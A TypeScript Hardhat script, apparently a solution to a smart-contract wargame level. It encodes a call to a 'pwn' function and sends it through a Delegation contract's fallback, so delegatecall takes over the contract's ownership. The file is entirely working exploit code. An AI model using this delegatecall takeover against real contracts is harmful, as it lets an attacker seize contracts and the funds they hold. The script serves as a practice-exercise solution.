import { ethers } from "hardhat";
import { Delegate, Delegation } from "../typechain";
import { Delegate__factory } from "../typechain/factories/Delegate__factory";
import { Delegation__factory } from "../typechain/factories/Delegation__factory";

async function main() {
  const [addr1] = await ethers.getSigners();

  const deployedAddress = '0x3D3B7C3983138ADdc5B011B5e9fC6Ca372e31f3F';
  const delegateInstance: Delegate = Delegate__factory.connect("0xE7dc12C53437A2CB28c8f82386A40FB29c43A09c", addr1);
  const delegationInstance: Delegation = Delegation__factory.connect(deployedAddress, addr1);

  const pwnData = delegateInstance.interface.encodeFunctionData("pwn");
  console.log(pwnData)

  console.log(await delegateInstance.owner())
  console.log(await delegationInstance.owner())
  let tx = await delegationInstance.connect(addr1).fallback({ data: pwnData, gasLimit: 200000 });
  await tx.wait();

  console.log(await delegateInstance.owner())
  console.log(await delegationInstance.owner())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
